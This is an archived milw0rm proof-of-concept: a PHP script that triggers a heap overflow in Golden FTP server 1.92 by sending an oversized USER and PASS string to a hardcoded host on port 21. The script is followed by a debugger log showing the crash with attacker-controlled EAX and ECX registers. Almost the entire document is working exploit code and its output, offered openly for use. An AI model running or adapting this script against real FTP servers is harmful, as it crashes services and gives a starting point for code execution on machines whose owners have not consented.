<html><head><title>Golden FTP server 1.92 (USER/PASS) Heap Overflow PoC</title></head><pre>&lt;?php
#23.07 03/12/2006
#Golden FTP server 1.92 (freeware edition) USER/PASS heap based overflow poc
#by rgod  retrog at alice dot it
#site: http://retrogod.altervista.org

#download link: http://www.download.com/3000-2160_4-10375602.html?tag=sd.EXAF

$host=&quot;192.168.1.3&quot;;
$port=&quot;21&quot;;

$junk=&quot;&quot;;
for ($i=1; $i&lt;=8095; $i++){
    $junk.=&quot;a&quot;;
}

$eax=&quot;AAAA&quot;;
$eax[0]=chr(ord($eax)-20); //to have the wanted eax
$ecx=&quot;BBBB&quot;;

$junk.=$ecx.$eax;

$sock=@fsockopen($host,$port,$errno, $errstr, 10);
if (!$sock){
   die(&quot;\nnot connected!\n&quot;);
}
else {
   fgets($sock,80);
   fputs($sock,&quot;USER &quot;.$junk.&quot;\r\n&quot;);
   fgets($sock,80);
   fputs($sock,&quot;PASS &quot;.$junk.&quot;\r\n&quot;);
   fclose($sock);
}
/*
...
17:07:28.144  pid=0870 tid=1128  EXCEPTION (first-chance)
              ----------------------------------------------------------------
              Exception C0000005 (ACCESS_VIOLATION reading [41414141])
              ----------------------------------------------------------------
              EAX=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              ECX=42424242: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EDX=00EBFD64: C4 9D A6 00 F4 BF A5 00-00 9F A6 00 BC FD EB 00
              ESP=00EBFD1C: 00 00 00 00 58 FD EB 00-61 24 41 00 80 9F A6 00
              EBP=00EBFD20: 58 FD EB 00 61 24 41 00-80 9F A6 00 F4 BF A5 00
              ESI=004B9F04: 2D 41 41 41 00 00 00 00-00 00 00 00 00 00 00 00
              EDI=004B9F00: 42 42 42 42 2D 41 41 41-00 00 00 00 00 00 00 00
              EIP=004A9B74: 8B 00 8B 12 E8 5F F6 FD-FF 0F 94 C0 83 E0 01 5B
                            --&gt; MOV EAX,[EAX]
              ----------------------------------------------------------------

17:07:28.254  pid=0870 tid=1128  Thread exited with code 0
...
*/
?&gt;

# milw0rm.com [2006-12-11]</pre></html>